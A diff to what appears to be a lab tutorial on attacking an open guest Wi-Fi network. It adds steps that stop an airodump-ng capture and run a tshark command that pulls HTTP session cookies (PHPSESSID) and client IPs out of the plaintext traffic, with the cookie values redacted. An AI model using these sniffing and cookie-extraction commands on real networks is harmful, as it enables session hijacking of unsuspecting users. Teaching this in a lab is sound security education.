@@ -185,8 +185,20 @@ user@debian-thm:~$ sudo airodump-ng -c 6 --bssid F0:9F:C2:71:22:10 -w opn wlan0m
 
 The channel lock, BSSID filter and -w prefix behave as they did in the reconnaissance room, holding the radio on Guest-WiFi so it is never listening elsewhere when the guest clients transmit, and writing what it hears to opn-01.cap  
 
+Leave the capture running while the guest clients are active, then stop it with Ctrl+C. A protected network would need a decryption step at this point. An open one establishes no key at all, so the frames in opn-01.cap are plaintext exactly as they were received.  
 
+tshark is the command-line form of Wireshark and reads a capture straight off disk. -r names the file. -Y http.cookie applies a display filter, keeping only the packets carrying a cookie header. -T fields drops the packet summaries in favour of bare values, and each -e names one field to print, ip.src for the address that sent the request and http.cookie for the cookie it carried:  
 
+```console
+user@debian-thm:~$ sudo tshark -r opn-01.cap -Y http.cookie -T fields -e ip.src -e http.cookie
+192.168.10.100	PHPSESSID=REDACTED-1
+192.168.10.101	PHPSESSID=REDACTED-2
+192.168.10.102	PHPSESSID=REDACTED-3
+192.168.10.102	PHPSESSID=REDACTED-3
+192.168.10.100	PHPSESSID=REDACTED-1
+192.168.10.101	PHPSESSID=REDACTED-2
+192.168.10.102	PHPSESSID=REDACTED-3
+```
 
 
 
